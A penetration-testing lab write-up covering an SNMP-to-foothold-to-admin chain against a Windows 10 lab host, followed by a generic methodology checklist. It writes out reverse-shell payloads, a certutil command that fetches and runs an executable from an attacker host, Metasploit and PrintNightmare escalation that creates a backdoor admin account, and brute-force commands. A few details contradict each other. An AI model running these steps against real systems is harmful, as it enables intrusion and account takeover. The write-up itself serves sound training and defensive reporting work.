01

Reconnaissance

Ten filtered ports and a host that was alive

Goal: decide whether the host is alive, what it exposes, and — because the first scan was entirely negative — whether that negativity was real.

1.1 The scan that said nothing

command
mkdir -p ~/Desktop/192.168.103.145 && cd ~/Desktop/192.168.103.145
sudo nmap -Pn -sV -O --script=vuln* \
  -p 21,80,135,139,161,445,1978,3389,5986,7680 \
  192.168.103.145 -oN 192.168.103.145_nmap_vulns.txt
output
Nmap scan report for 192.168.103.145
Host is up.

PORT     STATE    SERVICE    VERSION
21/tcp   filtered ftp
80/tcp   filtered http
135/tcp  filtered msrpc
139/tcp  filtered netbios-ssn
161/tcp  filtered snmp
445/tcp  filtered microsoft-ds
1978/tcp filtered unisql
3389/tcp filtered ms-wbt-server
5986/tcp filtered wsmans
7680/tcp filtered pando-pub
Too many fingerprints match this host to give specific OS details

Nmap done at Fri Nov 20 18:37:45 2026 -- 1 IP address, scanned in 17.14 seconds

Reading it: Host is up with every port filtered is not "no services". filtered means the SYN produced no answer — no-response — so nmap cannot tell an open port from a closed one. On a Windows box that is the signature of netsh advfirewall dropping unsolicited inbound, plus a lab router. The scan was 17 seconds long because nothing replied to anything; that speed is itself the tell that we were being dropped rather than refused.

Two things to note before moving on:

  • -Pn was correct. Without it nmap would have declared the host down and skipped scanning.
  • -sV had nothing to fingerprint. "Too many fingerprints match" is nmap admitting it never got a banner, not a real ambiguity.

Lesson that this box teaches the hard way: a filtered TCP scan is a statement about the firewall. It is not evidence that the host has no attack surface — and it says nothing at all about UDP.

1.2 The port the scan could not see

SNMP is UDP. nmap -p 161 scans TCP/161 (the SNMP trap port), which is almost never what is listening. The service we care about is 161/udp:

command
sudo nmap -sU -p 161 --reason 192.168.103.145

On this box the answer was immediate and unambiguous — the agent replied to a hand-built request even while every TCP port stayed filtered:

command
snmpget -v1 -c public -t 3 -r 1 -On 192.168.103.145 1.3.6.1.2.1.1.1.0
output
.1.3.6.1.2.1.1.1.0 = STRING: "Hardware: AMD64 Family 25 Model 1 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 19041 Multiprocessor Free)"

That single line is the whole recon phase in miniature: the host is Windows, build 19041, and it will talk SNMP to anyone with the community string.

1.3 First mistakes, recorded honestly

Three commands were run before the working one. Each failure is a lesson, so they stay in.

(a) No version specified.

command
snmpwalk 192.168.103.145
output
snmpwalk: Timeout

Modern net-snmp defaults to SNMPv3 noAuthNoPriv. A v1/v2c agent has no idea what to do with a v3 message and drops it, so the result is a timeout that looks identical to "wrong community". Always state the version explicitly.

(b) Wrong script — a Linux tree on a Windows host.

command
snmpwalk -v1 -c public 192.168.103.145 1.3.6.1.4.1.8072.1.3.2
output
End of MIB

1.3.6.1.4.1.8072 is the net-snmp enterprise OID. NET-SNMP-EXTEND-MIB only exists on Linux/Unix agents; Windows' built-in SNMP service returns end-of-tree. This is a successful walk of an empty subtree, not a permission error. Replaying Linux extend tricks against a Windows host always lands here.

(c) Community guessing, badly.

command
for c in kiero oscp oscp.exam student cl5 lab zachary public2 cisco; do
  printf "%-12s " "$c"
  snmpget -v1 -c "$c" -t 4 -r 0 192.168.103.145 1.3.6.1.2.1.1.5.0
done
output
kiero        Timeout: No Response
oscp         Timeout: No Response
oscp.exam    Timeout: No Response
student      Timeout: No Response
cl5          Timeout: No Response
lab          Timeout: No Response
zachary      Timeout: No Response
public2      Timeout: No Response
cisco        Timeout: No Response

Every one timed out — including the working community in a slightly different spelling. Wrong communities are dropped silently per RFC, so a timeout tells you nothing except "not this one". Nine guesses is also far too small a list to be meaningful; onesixtyone with a real wordlist is the right tool when public genuinely fails.

Here public was already correct. The lesson is to confirm what you have before brute-forcing what you don't.

1.4 What we entered the enumeration phase with

Fact Value Why it matters
Reachable SNMP UDP/161 only the TCP firewall is host-side; SNMP was allowed deliberately
OS Windows 10 19041 (2004) out of support since Dec-2021 → assume unpatched
Hostname zachary also sysContact → a human account name, not a service name

Corroborated later in the session: 1978/tcp went from filtered to open after the lab was refreshed. Re-scan before you write a port off. A snapshot reverting a firewall rule is enough to turn a dead box into a shell.

02

SNMP enumeration

Processes, software, and the 8072 dead end

Goal: turn one working community string into an inventory — identity, processes, software, users — and read that inventory the way you would read a shell's tasklist.

2.1 Confirm the agent and the version

command
snmpwalk -v1 -c public -On 192.168.103.145 1.3.6.1.2.1.1
output
.1.3.6.1.2.1.1.1.0 = STRING: "Hardware: AMD64 Family 25 Model 1 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 19041 Multiprocessor Free)"
.1.3.6.1.2.1.1.2.0 = OID: .1.3.6.1.4.1.311.1.1.3.1.1
.1.3.6.1.2.1.1.3.0 = Timeticks: (287801) 0:47:58.01
.1.3.6.1.2.1.1.4.0 = STRING: "zachary"
.1.3.6.1.2.1.1.5.0 = STRING: "zachary"

Four readings, in order of usefulness:

  • sysObjectID under 1.3.6.1.4.1.311 = Microsoft. This is the Windows extension agent, not a network device — so no Cisco-style config-download tricks, and no 8072 extend tree.
  • Build 19041 = Windows 10 2004. Windows SNMP always reports kernel 6.3 for Win10/11, so the build number is your only OS-version signal. It cannot show patch level — you find that out with a local tool later.
  • Uptime 0:47:58 — freshly booted. On a lab box that means a snapshot was restored, so anything you plant dies at revert.
  • sysContact = sysName = zachary. Not a service name. A human one. Keep it: it is a candidate account for SMB/WinRM/RDP if the shell route ever needs a fallback.

Always add -On (numeric OIDs). MIB-name rendering differs between installs and silently breaks parsing later.

2.4 Users, services, shares — LAN Manager MIB II

command
snmpwalk -v1 -c public -On 192.168.103.145 1.3.6.1.4.1.77.1.2.25

The table is indexed by the ASCII codes of the account name, so it comes back as …svUserName.5.71.117.101.115.116 = STRING: "Guest". Decode rather than squint:

command
snmpwalk -v1 -c public -On 192.168.103.145 1.3.6.1.4.1.77.1.2.25 \
  | sed -E 's/.*svUserName\.(([0-9]+\.?)+) = STRING: //' \
  | while read -r n; do echo "$n" | awk -F. '{for(i=2;i<=NF;i++) printf "%c", $i; print ""}'; done

On this host the table was sparse, and svShareTable (1.3.6.1.4.1.77.1.2.27) returned nothing — which is the normal Windows behaviour, not a permissions problem. Never report "no shares" from SNMP. Use SMB (netexec smb … --shares) once you have any credential.

2.5 The dead end, kept for the lesson

command
snmpwalk -v1 -c public 192.168.103.145 1.3.6.1.4.1.8072.1.3.2
output
End of MIB
command
snmpget -v1 -c public 192.168.103.145 1.3.6.1.4.1.8072.1.3.2.4.1.3.5.82.69.83.69.84
output
Error in packet
Reason: (noSuchName) There is no such variable name in this MIB.
Failed object: iso.3.6.1.4.1.8072.1.3.2.4.1.3.5.82.69.83.69.84

Decode that index: 5 = length, then 82 69 83 69 84 = RESET. This is the Linux extend RESET /usr/bin/… pattern from countless OSCP writeups — an extend entry whose cached output (nsExtendOutput*) leaks command output, sometimes run as root.

On a Windows host the entire 8072 tree is empty, because it is not net-snmp. Two signals said so before the walk: sysObjectID was 1.3.6.1.4.1.311 (Microsoft), and sysDescr was Windows. Once you know the agent is Microsoft's, stop trying Linux playbooks.

Signal Microsoft agent net-snmp agent
sysObjectID 1.3.6.1.4.1.311.* 1.3.6.1.4.1.8072.*
8072.1.3.2 extend tree empty populated, output cached
hrSWRunTable full process list sparse/absent
hrSWInstalledTable full software list usually absent

03

Vulnerability analysis

CVE-2022-3218 and its real precondition

Goal: decide, from the inventory in chapter 02, which single route to attack — and confirm its preconditions instead of assuming them.

3.1 The package

Mouse Server version 1.7.8.5 — Necta's WiFi Mouse, a Windows server that lets a phone act as a wireless mouse and keyboard. It listens on TCP 1978 and speaks a tiny line protocol:

Command Effect
openfile /C/Windows/System32/cmd.exe launches a program on the desktop
utf8 <text> types that text into whatever window has focus
key 3RTN presses Return (two spaces; 3RTN is the app's keycode for Enter)
fileexplorer ~/ lists a directory

3.2 The flaw — CVE-2022-3218

The server has a PIN/"needpassword" feature. The check is implemented on the mobile client, not on the server: the server announces needpassword, and the app is what pops the PIN dialog. A custom client simply ignores the banner and sends the same commands. Result: unauthenticated remote keystroke injection.

  • Fixed in 2.0.0.5; every 1.x build is affected.
  • Public exploits: EDB-49601 (Python 2), EDB-50972 (Python 3 port), EDB-51072 (1.8.3.2), EDB-51016 (bash/socat), and Metasploit exploit/windows/misc/wifi_mouse_rce.
  • CVSS puts it at critical, but the honest description is: an unauthenticated keyboard on someone else's desktop. It is RCE only because a keyboard can open a command prompt.

3.3 Why this box is exploitable and a server would not be

Two preconditions, and SNMP answered both before a single TCP packet was sent:

Precondition Evidence Consequence if absent
Vulnerable version installed hrSWInstalledName → Mouse Server version 1.7.8.5 nothing to attack
Service running hrSWRunName → MouseServer.exe installed-but-dead = no listener
Interactive desktop session explorer.exe, dwm.exe, sihost.exe, SearchApp.exe exploit connects, types into nothing, silent no-op

The third is the one people miss. There is no error when keystrokes land nowhere: the socket accepts, the commands go out, and nothing happens. Verify the session before firing, so that a failure means "wrong payload" instead of "no idea".

Caveat: a locked session (Win+L) still blocks it even though the processes are present. Someone has to be logged on and the desktop unlocked.

3.4 Confirm the port before choosing a tool

The earlier scan had 1978/tcp filtered. After the lab was refreshed:

command
nmap -Pn -sT -p1977,1978 --max-retries 1 --reason 192.168.103.145
output
PORT     STATE    SERVICE        REASON
1977/tcp filtered tcoaddressbook no-response
1978/tcp open     unisql         syn-ack

1978/tcp open with a syn-ack — the port the exploit needs is reachable. Note that nmap labels it unisql; that is just the closest entry in its service table. Port names are guesses, banners are facts.

1977/udp is the app's LAN-discovery port. Not needed: we know the address.

If 1978 had stayed filtered while MouseServer.exe was running, the correct conclusion would be "host firewall blocks it" — then look for the IIS app (w3wp.exe) as a way to reach loopback, or a pivot. It is not a reason to abandon the box.

3.5 Route selection

Candidate Verdict
Mouse Server 1.7.8.5 → CVE-2022-3218 primary — version, process, desktop session all confirmed
IIS (w3wp.exe) on an unknown port hold — we never learned the port; SNMP tcpConnTable would show it
RDP 3389 filtered at the time; keep for later, needs credentials
SMB null session / zachary guesses secondary — no shares exposed via SNMP, and guessing risks lockout
Defender evasion not a route, a constraint: the payload must survive AMSI

One route, chosen on evidence, with the constraint written down. That is the whole decision.

3.6 The constraint that shaped everything after

MsMpEng.exe, MpDefenderCoreService.exe and SecurityHealthService.exe were all running. Any executable dropped on disk is scanned on write; a stock msfvenom EXE is a coin flip.

This is why the Metasploit route below uses windows/shell/reverse_tcp — a staged, memory-resident stager rather than a self-contained EXE — and why the later escalation uses a signed PowerShell script (PrintNightmare) rather than an unsigned binary. Both choices are Defender decisions, not stylistic ones.

3.7 Expectation management for what comes next

The shell from this exploit runs as the logged-on user, not SYSTEM and not an administrator. That is not a flaw in the exploit; it is what a keyboard gives you. Chapter 05 shows why the reflex answer (getsystem) fails on this box, and chapter 06 shows what to do instead.

04

Foothold

wifi_mouse_rce → shell as offsec

Goal: get a shell as the logged-on user, and know exactly what privileges it carries before touching anything else.

4.1 Metasploit — wifi_mouse_rce

Note the working directory: C:\Program Files (x86)\. The shell inherits the service's context, and MouseServer runs from its install directory. That path is also a reminder of why the foothold cannot escalate itself — see 4.5.

Why these options

Option Value Reason
RPORT 1978 (default) the protocol port
PAYLOAD windows/shell/reverse_tcp staged and small — every byte is typed on the remote desktop

The payload constraint is the whole trick. This module uses a command stager: it types certutil/PowerShell lines that download a small stage, then executes it. A 200 KB Meterpreter stager typed at ~40 characters per second with a desktop in the middle would drop characters. A staged shell/reverse_tcp is the smallest thing that yields a usable session.

ipconfig on the Kali side if LHOST is ever wrong:

command
ip -4 addr show tun0 | grep inet

4.2 First actions — establish identity, not access

Before exploring:

command
whoami
whoami /priv
whoami /groups
net localgroup administrators

The identity was already visible in Meterpreter:

output
meterpreter > getuid
Server username: OSCP\offsec

OSCP\offsec — a local account on machine OSCP (MACHINE\user means a local account, not a domain one). sysName said zachary, but sysName is a free-text SNMP string somebody typed; the real computer name is what Windows reports. Trust the OS over the MIB.

zachary was a lead — a possible account for a later credential guess — not the hostname. Keep both facts; do not overwrite one with the other.

4.3 Upgrade to Meterpreter

output
sessions -u <id from sessions -l>
sessions -i <the new id it prints>
output
[*] Upgrading session ID: 13
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.45.158:4433
[*] Sending stage (232006 bytes) to 192.168.103.145
[*] Meterpreter session 14 opened (192.168.45.158:4433 -> 192.168.103.145:50949) at 2026-11-21 02:07:50 -0500
[*] Stopping exploit/multi/handler

Session ids drift as you upgrade and re-upgrade; always re-read sessions -l instead of assuming the next number. Running sessions -u 12 when only 11 and 13 existed produced [-] Invalid session identifier: 12 — harmless, but a good reminder that every sessions sub-command takes the id from the table, not from your memory.

Meterpreter buys three things a raw shell does not: upload/download without SMB, search -f across the filesystem, and getsystem. It costs a 232 KB stage over a typed stager — which worked here, but is the first thing to suspect if the session dies mid-upgrade.

A plain shell is enough for everything in this box; the upgrade is for convenience.

4.4 The no-Metasploit route (EDB-50972)

Same primitive, useful when MSF is unavailable or the command stager is blocked:

command
searchsploit -m 50972
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.158 LPORT=443 -f exe -o s.exe
python3 -m http.server 80
nc -lvnp 443

In another pane:

command
python3 50972.py 192.168.103.145 192.168.45.158 s.exe

The script types, character by character with a 30 ms delay:

output
openfile /C/Windows/System32/cmd.exe
certutil.exe -urlcache -f http://192.168.45.158/s.exe C:\Windows\Temp\s.exe
C:\Windows\Temp\s.exe

Two practical notes from this box's image family:

  • certutil downloads work where reverse shells often do not. Defender blocks the execution of stock payloads more reliably than it blocks the download. If the staged EXE never runs, try an in-memory loader instead of a file.
  • nc.exe fetched but would not execute on the sibling build of this image. Do not plan around a bare nc.

The bash variant (EDB-51016) does the same with socat, and includes a fileexplorer mode that dumps directory listings over the same socket — handy for reading files when you cannot yet run commands:

command
echo 'fileexplorer ~/' | nc 192.168.103.145 1978 | strings

4.5 What the foothold gives you, precisely

You have You do not have
Code execution as offsec Administrator or SYSTEM
A desktop that accepts keystrokes SeImpersonatePrivilege
Read access to C:\Users\offsec Read access to other profiles

Check the last row properly in the next chapter. Build 19041 tells you the release, not the hotfix state, and the difference decides which local exploit works.

4.6 Cleanup note

The command stager leaves a stage on disk (C:\Windows\Temp\… or the user's %TEMP%) and opens a console window on the remote desktop that stays visible until the session ends. On a real engagement that window is the loudest thing you will do all day — note it in the report, and remove the stage before you leave.

05

Enumeration & dead ends

getsystem 1346, and why potatoes fail

Goal: find out why the reflexive escalation fails, and pick the primitive that actually fits this token.

5.1 The reflexive attempt, and its exact failure

output
meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: 1346 The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
[-] Named Pipe Impersonation (PrintSpooler variant)
[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
output
meterpreter > getuid
Server username: OSCP\offsec

1346 is ERROR_BAD_IMPERSONATION_LEVEL — "either a required impersonation level was not provided, or the provided impersonation level is invalid". In practice, for getsystem, it means the current token cannot impersonate a SYSTEM token because it does not hold SeImpersonatePrivilege. Every one of the six techniques in that list needs the same thing, which is why all six failed identically.

This is the single most useful error in the whole box. It is not "try harder with the same tool" — it is "this primitive is unavailable, change class of attack".

5.2 Confirm it from the token itself

command
whoami /priv
whoami /groups
net localgroup administrators

Read three things:

Look for Meaning
SeImpersonatePrivilege present a potato (PrintSpoofer / GodPotato / JuicyPotatoNG) works — one step to SYSTEM
BUILTIN\Administrators in whoami /groups you are an admin; the only obstacle is UAC (Medium Mandatory Level)
Neither standard user: you need a local privilege escalation, not a token theft

On this host it was the third case: offsec is a plain local user, no impersonate privilege, not a member of the local administrators group. That is also why getsystem printed 1346 rather than succeeding on the RPCSS variant.

If you only remember one thing from this box: potatoes are not a privilege-escalation technique, they are a way to use a privilege you already have. Without SeImpersonate*, skip them entirely.

5.3 What was checked and came back empty

These are the standard first-pass checks on a Windows foothold. They are listed because "I looked" is not evidence — each one has a specific reading that closes it off.

Check What a hit looks like Why it did not help here
Unquoted service paths a path with spaces, unquoted, in a directory Users can write no such service on this image

Note what is not on that list and why:

  • Hijacking MouseServer's own DLLs (lum_sdk32.dll on the sibling image) is pointless. The process runs in offsec's session, so a hijacked DLL gives you offsec again.
  • w3wp.exe is interesting but needs the port, and the web app was never identified. A tcpConnTable walk from SNMP (chapter 02) would have named it; that is the faster route than guessing.

5.4 Enumerate patches, not versions

Build 19041 tells you "Windows 10 2004". It does not tell you whether the June/July 2021 cumulative updates are installed, and that single fact decides whether PrintNightmare works.

command
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Hotfix"
wmic qfe list brief | findstr /i "5004945 5004954 5005565"
  • KB5005565 (September 2021) and later contain the Point-and-Print hardening that breaks the standard exploit path.
  • KB5004945 / KB5004954 (July 2021) are the out-of-band PrintNightmare patches.
  • An empty Hotfix list on a build-19041 image is the answer you want: nothing was ever applied.

Metasploit automates this triage:

output
background
use post/multi/recon/local_exploit_suggester
set SESSION 14
run

It returns named modules — exploit/windows/local/cve_2021_1675_printnightmare, various bypassuac_*, and so on — with a confidence marker per module. Use it to confirm the theory you already formed, not instead of forming one.

5.5 The decision

Route Requirement Status on this box
Potato (SeImpersonate) the privilege not held — 1346 proves it
UAC bypass membership in Administrators not a member
Unquoted path / writable service a misconfigured service none found
AlwaysInstallElevated both registry keys not set
PrintNightmare Spooler running + unpatched spoolsv.exe confirmed via SNMP, 19041 unpatched

One column is green, and it was green before the shell ever landed: SNMP had already told us spoolsv.exe was running. That is the payoff of enumerating processes properly in chapter 02.

06

Privilege escalation

PrintNightmare from a standard user

Goal: go from a standard user to a local administrator on a build-19041 host with the Spooler running and no SeImpersonatePrivilege to abuse.

6.1 Why this vulnerability fits this token

PrintNightmare abuses the Print Spooler's RpcAddPrinterDriverEx interface. The Spooler runs as SYSTEM, and it will load a print driver DLL from a path the caller supplies. Historically it did not require the caller to be an administrator for every code path, and it never validated that the DLL came from a trusted location. The result:

any authenticated local user can make a SYSTEM service load their DLL.

Two CVE identifiers matter, and it is worth knowing which is which:

CVE What it is
CVE-2021-1675 the original "Print Spooler RCE" — the AddPrinterDriverEx path traversal/loading flaw
CVE-2021-34527 the bypass of the July 2021 patch — the remote/\\attacker\share variant that made it famous

The classic Invoke-Nightmare script targets the 1675 interface locally and needs only a normal user session. That is exactly the situation after chapter 05: no impersonate privilege, no admin group membership, but a live Spooler.

Precondition, restated: spoolsv.exe must be running. SNMP confirmed it in chapter 02, before we ever had a shell.

6.2 Get the script onto the box

From a Meterpreter session:

output
cd C:\Users\offsec\AppData\Local\Temp
upload /opt/tools/cve-2021-1675.ps1
load powershell
powershell_shell

Without Meterpreter, certutil works on this image family where other transfers do not:

command
cd C:\Users\offsec\AppData\Local\Temp
certutil -urlcache -split -f http://192.168.45.158/cve-2021-1675.ps1 cve-2021-1675.ps1
powershell -ep bypass

-ep bypass matters: the default execution policy would refuse the unsigned script.

6.3 Run it

command
Import-Module .\cve-2021-1675.ps1
Invoke-Nightmare
output
PS C:\Users\offsec\AppData\Local\Temp> Import-Module .\cve-2021-1675.ps1
PS C:\Users\offsec\AppData\Local\Temp> Invoke-Nightmare
[+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\offsec\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\WINDOWS\System32\DriverStore\FileRepository\ntprin
[+] added user  as local administrator
[+] deleting payload from C:\Users\offsec\AppData\Local\Temp\nightmare.dll

Read the output line by line:

Line Meaning
using default new user: adm1n the script defaults to creating adm1n / P@ssw0rd; pass -NewUser/-NewPassword to change
created payload at …\nightmare.dll a DLL that calls NetLocalGroupAddMembers when the Spooler loads it
using pDriverPath … ntprint.inf_amd64_… an existing, signed printer driver INF used as the vehicle
added user as local administrator the blank name is a bug in the script's string formatting, not a failure. The account created is adm1n
deleting payload … it cleans the DLL up itself; no artifact left in TEMP

That blank field is worth flagging explicitly, because the obvious reading — "it added nothing" — is wrong, and people re-run the exploit chasing a failure that did not happen. The proof is the next command, not the message.

6.4 Verify before you use it

command
net user adm1n
net localgroup administrators
output
User name                    adm1n
Local Group Memberships      *Administrators

If adm1n is absent, the Spooler rejected the driver load — check Get-Service Spooler, and look at C:\Windows\System32\spool\drivers\x64\3\ for leftovers. If the account exists but is not in Administrators, the DLL ran but the group call failed; create the membership manually from the SYSTEM context it gave you.

6.5 Use the account

An administrator session is what you need for the flag; a network logon is not the same as an interactive one, so RDP is the cleanest route:

command
xfreerdp /u:adm1n /v:192.168.103.145 /p:'P@ssw0rd' /cert:ignore +clipboard
output
xfreerdp /u:adm1n /v:192.168.103.145 /p:'P@ssw0rd'

Notes that save time:

  • The password contains characters the shell will happily eat — single-quote it in bash.
  • RDP was filtered in the original scan. It answered once the lab was refreshed; re-scan before concluding it is closed.
  • If RDP is genuinely unavailable, an admin context is also reachable with runas /user:adm1n cmd from any shell, or psexec.py/wmiexec.py with those credentials — but those give you a network logon and a non-interactive desktop, which matters if the flag is on a user's desktop.

Why an admin and not SYSTEM

adm1n is a local administrator, which is enough to read proof.txt and to take ownership of any profile's files. It is not SYSTEM. If a box required SYSTEM specifically, the next step from here is one command — make the account's payload a service:

command
sc create pwn binPath= "cmd /c C:\Users\offsec\AppData\Local\Temp\s.bat" start= auto
sc start pwn

or simply re-use the admin token with getsystem from a Meterpreter session running as adm1n (that token does carry SeImpersonatePrivilege, so the potato path opens up).

6.6 Alternatives if the script is blocked

Route Command
Metasploit module use exploit/windows/local/cve_2021_1675_printnightmare, set SESSION, set PAYLOAD windows/x64/meterpreter/reverse_tcp, run
SharpPrintNightmare SharpPrintNightmare.exe C:\Windows\System32\spool\drivers\x64\3\evil.dll (remote variant takes a UNC path)

All of them need the same two things: an authenticated local session and a running Spooler.

6.7 Does this box even need SYSTEM?

Worth saying out loud, because it changes how much work you do: on this host the flag was readable from the administrator's context, and PrintNightmare delivered exactly that. Escalating further to SYSTEM would have been ceremony, not progress.

Judge the requirement from what you actually need to read, not from a habit of "always get SYSTEM".

Proof, removing adm1n, lessons

Goal: capture the proof, then remove every artefact this box was made to leave behind.

7.1 Where the flags live on an OSCP-style Windows box

File Owner Needs

proof.txt Administrator local admin / SYSTEM

Standard locations:

command
type C:\Users\offsec\Desktop\local.txt
type C:\Users\Administrator\Desktop\proof.txt

The usual alternates, in the order worth trying:

command
dir C:\proof.txt C:\Users\Public\Desktop\proof.txt C:\Users\Administrator\Desktop\proof.txt 2>nul

output

7.2 Reading proof.txt

Over RDP as adm1n, open C:\Users\Administrator\Desktop\proof.txt. Because adm1n is a local administrator, the profile's ACLs do not stop you; if a file is stubborn, Explorer → Properties → Security → take ownership, or from an admin cmd:

command
icacls C:\Users\Administrator\Desktop\proof.txt /grant adm1n:F
type C:\Users\Administrator\Desktop\proof.txt

Flag values are deliberately not reproduced in this writeup. Copy the hash into your own notes and the score sheet — publishing a live exam flag is both useless to a reader and a rules problem on the platform it came from.

7.3 Cleanup — the part people skip

You created an account, dropped a DLL, and opened a console window on somebody's desktop. Undo it.

1. Remove the account you created (as an administrator):

command
net user adm1n /delete
net localgroup administrators

2. Remove the scripts and stages:

command
del C:\Users\offsec\AppData\Local\Temp\cve-2021-1675.ps1
del C:\Users\offsec\AppData\Local\Temp\s.exe
del C:\Users\offsec\AppData\Local\Temp\nightmare.dll

Invoke-Nightmare deletes its own DLL, but only on the success path — check anyway.

3. Check for leftover print drivers. PrintNightmare loads a driver into the Spooler; a failed run can leave a package behind:

command
dir C:\Windows\System32\spool\drivers\x64\3\
rundll32 printui.dll,PrintUIEntry /s /t2

Remove anything you did not find before you started.

4. Close the sessions — sessions -K on the MSF side — and revert the snapshot if the lab is snapshot-based. On this box uptime was 48 minutes at first contact, so the image was freshly booted; a revert is a legitimate and complete cleanup.

5. Report the side effect you cannot undo: the console window on the desktop. It is the visible artefact of a keystroke-injection exploit and should be in the report's "detection opportunities" section.

7.4 What this box teaches

1. filtered is not closed, and TCP is not everything. Ten ports came back filtered and the box looked dead. It was alive on UDP/161 the whole time. A port scan describes a firewall's opinion, not a host's services — and 1978/tcp flipped from filtered to open after a snapshot refresh, so ports must be re-verified, not remembered.

2. SNMP answers "what is installed" and "who is logged in". hrSWInstalledName named the vulnerable package; hrSWRunName proved an interactive desktop existed. The second fact is invisible to any port scan and is the precondition for a keystroke exploit. That is why snmpwalk on 1.3.6.1.2.1.25.4.2.1.2 is worth more than the ports it costs.

3. A filtered port is not a reason to abandon the CVE. 1978 was filtered on first contact. The right response is to re-scan, then to look for a way to reach it (IIS, pivot, loopback) — not to pick a different exploit.

4. Read the escalation error, do not retry the tool. 1346 ERROR_BAD_IMPERSONATION_LEVEL means "no SeImpersonatePrivilege". Running getsystem five more times, or swapping PrintSpoofer for GodPotato, changes nothing: potatoes consume a privilege, they do not create one. Change class of attack instead.

5. Patch level is not version. Build 19041 is a release, not a hotfix level. systeminfo/wmic qfe decides whether PrintNightmare is available, and SNMP can never tell you.

6. Escalate to the level the objective needs. A local admin read the flag. SYSTEM would have been more work for no additional proof.

7.5 Detection notes (for the report)

Action Where it shows up
SNMP walk snmp.exe request counters; UDP/161 from an unexpected host
CVE-2022-3218 a console window on the desktop; the MouseServer process spawning cmd.exe
certutil -urlcache Microsoft-Windows-CertUtil/PowerShell script-block logs; the URL in proxy logs
PrintNightmare Spooler AddPrinterDriverEx events, a new local account, Security 4720/4732
adm1n creation Security event 4720 (user created) + 4732 (added to Administrators)
RDP logon Security 4624 type 10 from an unusual source

The last two are the loudest things on this box. A blue team that only alerts on those would still have caught the escalation — which is worth saying in the report, because it separates "exploitable" from "undetectable".

Methodology

The repeatable per-box loop

The loop I run on every box, in order, with the rule that makes each step worth its time. This is deliberately shallow-then-deep: cheap checks across the whole surface first, expensive work only where evidence points.

Phase 0 — Setup

command
mkdir -p /tmp/<box> && cd /tmp/<box>
export TARGET=<ip>

Everything for the box lands in one directory: scan output, loot, evidence. It makes writing the report afterwards trivial and stops me confusing two boxes' output.

Phase 1 — Reachability and TCP

Step Command Rule
Ping ping -c 2 -W 2 $TARGET TTL tells you the OS before you scan (64 Linux, 128 Windows)
Full TCP nmap -p- --min-rate 3000 -T4 -oN full_tcp.txt $TARGET Always -p-. A top-1000 scan is a guess
Versions nmap -sV -sC -p<open> -oN services.txt $TARGET Only the open ports; -sC is cheap and occasionally decisive

Decision: for each open port, ask "what is the configuration weakness most likely to be, given this version?" Version CVEs come last — most boxes are misconfigured, not unpatched.

Phase 2 — UDP (do not skip this)

command
nmap -sU --top-ports 30 -T4 --max-retries 1 --host-timeout 180s $TARGET

If 161/udp is open:

command
for c in public private manager internal; do
  snmpwalk -v1 -c "$c" -t 5 -r 1 $TARGET 1.3.6.1.2.1.1 2>&1 | head -3
done

Then, on success, always:

command
snmpwalk -v1 -c public $TARGET 1.3.6.1.4.1.8072.1.3.2   # nsExtendTable — the money tree
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.25.4.2.1.2   # process names
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.25.6.3.1.2   # installed packages
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.4.20.1.1     # interface IPs

nsExtendTable gives you the commands the agent runs plus the admin's own description of them. Descriptions are written for an internal audience and routinely name accounts and policies.

Phase 3 — Per-service enumeration

For each service, in the order that historically pays fastest.

HTTP/HTTPS

command
curl -s -i http://$TARGET/ | head -20          # stock page? framework? redirect?
for p in robots.txt sitemap.xml .git/ .htaccess server-status; do
  curl -s -o /dev/null -w "%{http_code} %{size_download}  /$p\n" http://$TARGET/$p
done
feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 40 -d 2 --smart --no-state -q
  • Note the 404 body size — it is your filter for everything after.
  • Vhosts: ffuf -u http://$TARGET/ -H "Host: FUZZ" -w <subdomains> -fr "<default page text>".
  • Timebox it. If the page is byte-identical to a stock install and two wordlists agree, stop.

FTP

command
ftp -n -v $TARGET <<< $'user anonymous anon@test\nls\nbye'   # 530 on USER = anonymous_enable=NO
hydra -L users.txt -P pass.txt -t 4 -f ftp://$TARGET

Try the account name as the password. Check for key material, configs, and backups in the data directory — a shared /srv/ftp often leaks a different account's secrets.

SSH

command
ssh -i key -o BatchMode=yes user@$TARGET id      # never point a key at a host without -o BatchMode
ssh-keygen -l -f key                             # read the comment first: it names the user

SMB

command
nxc smb $TARGET -u '' -p '' --shares
nxc smb $TARGET -u guest -p '' --shares
nxc smb $TARGET -u user -p pass -d DOMAIN --shares

Phase 4 — Foothold

Get a shell, then immediately stabilise and record identity:

command
id; hostname; sudo -n -l; uname -a

Do not start hunting for privesc before you know exactly which uid and groups you hold — the escalation path depends on it.

Phase 5 — Local enumeration (Linux)

Send one script over one connection and read one report:

command
ssh user@$TARGET 'bash -s' < enum.sh

Checklist, in the order that finds things:

# Check Command
1 sudo rights sudo -n -l
2 SUID, excluding snap noise find / -perm -4000 -type f 2>/dev/null \| grep -v '^/snap'
3 Capabilities getcap -r / 2>/dev/null
4 Cron cat /etc/crontab; ls -la /etc/cron.*
5 Writable service files find / -writable -type f -path '*/etc/*' 2>/dev/null
6 Listening sockets ss -tlnp
7 Home directories ls -la /home/* — this box had the SUID helper in a user's home
8 History and keys ls -la ~/.ssh; cat ~/.bash_history
9 Kernel uname -a — only if 1–8 are empty
10 Password reuse the foothold password against sudo -S and other users

Rule: a custom SUID binary beats every generic exploit. Read it before reaching for linpeas output tables.

Phase 6 — Binary analysis (when a SUID binary looks custom)

command
file /path/binary                    # not stripped? then function names survive
strings -a /path/binary | head -40   # look for system, popen, exec*, and bare command names
objdump -d -M intel /path/binary | sed -n '/<main>:/,/^$/p'
